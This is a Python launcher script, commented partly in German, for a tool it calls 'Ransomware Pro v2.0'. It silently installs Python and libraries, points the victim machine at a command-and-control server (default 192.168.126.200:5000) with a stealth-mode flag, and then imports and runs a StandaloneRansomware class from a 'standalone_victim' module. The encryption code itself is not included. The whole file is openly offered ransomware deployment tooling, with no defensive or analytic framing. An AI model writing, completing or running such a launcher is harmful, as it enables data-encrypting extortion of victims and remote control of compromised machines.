#!/usr/bin/env python3
"""
RANSOMWARE PRO - UNIVERSAL AUTO-INSTALLER & LAUNCHER
=====================================================
Installiert alles automatisch:
- Python (falls nicht da)
- Dependencies (falls nötig)
- Startet Ransomware
"""

import os
import sys
import subprocess
import platform
import urllib.request
import shutil

def check_python():
    """Check ob Python installiert ist"""
    try:
        import sys
        return sys.version_info >= (3, 6)
    except:
        return False

def install_python():
    """Installiere Python automatisch"""
    print("[*] Python not found, installing...")
    
    system = platform.system()
    
    if system == 'Windows':
        print("[*] Downloading Python 3.11 for Windows...")
        try:
            url = 'https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe'
            installer = 'python-installer.exe'
            
            urllib.request.urlretrieve(url, installer)
            
            print("[*] Running Python installer...")
            subprocess.run([installer, '/quiet', 'InstallAllUsers=1', 'PrependPath=1'], 
                         capture_output=True)
            
            if os.path.exists(installer):
                os.remove(installer)
            
            print("[+] Python installed!")
            return True
        except Exception as e:
            print(f"[!] Could not install Python: {e}")
            return False
    
    elif system == 'Linux':
        print("[*] Installing Python via apt...")
        subprocess.run(['apt-get', 'update'], capture_output=True)
        subprocess.run(['apt-get', 'install', '-y', 'python3'], 
                      capture_output=True)
        print("[+] Python installed!")
        return True
    
    elif system == 'Darwin':  # macOS
        print("[*] Installing Python via brew...")
        subprocess.run(['brew', 'install', 'python3'], capture_output=True)
        print("[+] Python installed!")
        return True
    
    return False

def install_dependencies():
    """Installiere nur wirklich nötige Dependencies (wenn nicht standalone)"""
    print("[*] Checking dependencies...")
    
    # Für standalone brauchen wir NICHTS!
    # Wenn jemand c2_server oder andere volle version braucht:
    optional_deps = [
        ('cryptography', 'cryptography'),
        ('requests', 'requests'),
        ('flask', 'flask'),
    ]
    
    for module, package in optional_deps:
        try:
            __import__(module)
        except ImportError:
            print(f"[*] Installing {package}...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', package],
                         capture_output=True, timeout=60)

def setup_environment(c2_host='192.168.126.200'):
    """Setup Environment Variables"""
    os.environ['C2_HOST'] = c2_host
    os.environ['C2_PORT'] = '5000'
    os.environ['STEALTH_MODE'] = 'true'
    os.environ['PYTHONUNBUFFERED'] = '1'

def run_ransomware():
    """Starte die Ransomware"""
    print("\n" + "="*60)
    print("RANSOMWARE PRO v2.0 - LAUNCHING...")
    print("="*60 + "\n")
    
    try:
        # Importiere inline, damit wir sicher sind dass Module da sind
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        from standalone_victim import StandaloneRansomware
        
        ransomware = StandaloneRansomware()
        ransomware.run()
    
    except ImportError as e:
        print(f"[!] Import error: {e}")
        print("[!] Trying to install dependencies...")
        install_dependencies()
        
        # Try again
        try:
            from standalone_victim import StandaloneRansomware
            ransomware = StandaloneRansomware()
            ransomware.run()
        except Exception as e:
            print(f"[!] Fatal error: {e}")
            import traceback
            traceback.print_exc()
            sys.exit(1)
    
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

def main():
    """Main entry point"""
    print("""
============================================================
 RANSOMWARE PRO v2.0 - UNIVERSAL AUTO-INSTALLER
 Automatic Python + Dependencies + Ransomware Launch
============================================================
    """)
    
    # Get C2 host from command line
    c2_host = sys.argv[1] if len(sys.argv) > 1 else '192.168.126.200'
    print(f"[*] C2 Server: {c2_host}:5000\n")
    
    # 1. Check/Install Python
    if not check_python():
        print("[!] Python check failed")
        if not install_python():
            print("[!] Could not install Python")
            print("[!] Please install Python 3.8+ manually from python.org")
            sys.exit(1)
    else:
        print(f"[+] Python {sys.version.split()[0]} available")
    
    # 2. Setup environment
    setup_environment(c2_host)
    
    # 3. Install optional dependencies
    try:
        install_dependencies()
    except Exception as e:
        print(f"[!] Dependency install error (continuing anyway): {e}")
    
    # 4. Run ransomware
    run_ransomware()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
